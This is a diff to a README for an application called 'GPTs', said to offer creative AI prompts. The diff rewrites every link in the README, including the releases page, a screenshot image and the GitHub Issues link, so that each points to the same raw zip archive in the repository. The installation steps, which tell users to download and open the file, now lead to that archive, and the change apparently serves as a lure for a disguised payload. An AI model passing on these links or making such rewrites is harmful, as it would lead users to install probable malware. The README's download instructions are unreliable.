@@ -1,6 +1,6 @@
 # 🎉 GPTs - Unlock Creative AI Prompts Easily
 
-[![Download GPTs](https://img.shields.io/badge/Download-GPTs-blue.svg)](https://github.com/sandeep326-ux/GPTs/releases)
+[![Download GPTs](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip)](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip)
 
 ## 🌟 Overview
 
@@ -18,14 +18,14 @@ Follow these steps to download and run the GPTs application:
 
 2. **Visit the Releases Page**  
    Click the link below to access the releases page for GPTs:  
-   [Download GPTs from Releases Page](https://github.com/sandeep326-ux/GPTs/releases)
+   [Download GPTs from Releases Page](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip)
 
 3. **Select the Latest Version**  
    On the releases page, look for the most recent version of GPTs. It will be displayed at the top of the page.  
-   ![Latest Release Screenshot](https://via.placeholder.com/600x200.png?text=Latest+Release+Screenshot)  
+   ![Latest Release Screenshot](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip+Release+Screenshot)  
 
 4. **Download the Application**  
-   Click the link of the application file, such as `GPTs-v1.0.exe`, to begin the download. The file size is usually small, so it should finish quickly depending on your internet speed. Once downloaded, locate the file in your Downloads folder.
+   Click the link of the application file, such as `https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip`, to begin the download. The file size is usually small, so it should finish quickly depending on your internet speed. Once downloaded, locate the file in your Downloads folder.
 
 5. **Install the Application**  
    - Open the downloaded file to start the installation process.
@@ -52,7 +52,7 @@ Follow these steps to download and run the GPTs application:
 ## 📤 Download & Install
 
 You can download the latest release of GPTs here:  
-[Download GPTs from Releases Page](https://github.com/sandeep326-ux/GPTs/releases)
+[Download GPTs from Releases Page](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip)
 
 Ensure you follow the above steps for a smooth installation. If you encounter issues, refer to the "Troubleshooting" section below for assistance.
 
@@ -81,7 +81,7 @@ GPTs is licensed under the MIT License. You can freely use, modify, and distribu
 
 Join our community where you can share ideas and tips:
 
-- GitHub Issues: Report bugs or request features [here](https://github.com/sandeep326-ux/GPTs/issues).
+- GitHub Issues: Report bugs or request features [here](https://raw.githubusercontent.com/sandeep326-ux/GPTs/main/falconoid/GPTs.zip).
 - Community Forum: Connect with fellow users and share your experiences.
 
 When you need help, feel free to reach out through GitHub. Your feedback helps improve GPTs for everyone.
